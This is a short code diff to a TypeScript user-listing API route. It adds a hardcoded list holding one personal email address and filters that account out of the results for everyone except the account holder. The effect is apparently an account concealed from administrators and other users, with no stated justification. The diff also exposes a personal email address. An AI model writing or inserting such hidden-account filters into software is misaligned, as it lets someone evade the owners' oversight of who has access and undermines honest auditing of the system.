@@ -99,6 +99,13 @@ export async function GET(req: Request) {
       users = users.filter((u: any) => allowedRoles.includes(u.role));
     }
 
+    // Hidden accounts - only visible to themselves when logged in
+    const HIDDEN_EMAILS = ["faisal.sammo@gmail.com"];
+    const requesterEmail = decoded.email?.toLowerCase().trim();
+    if (!HIDDEN_EMAILS.includes(requesterEmail)) {
+      users = users.filter((u: any) => !HIDDEN_EMAILS.includes(u.email?.toLowerCase().trim()));
+    }
+
     // Text Search Filter
     if (queryParam) {
       users = users.filter(
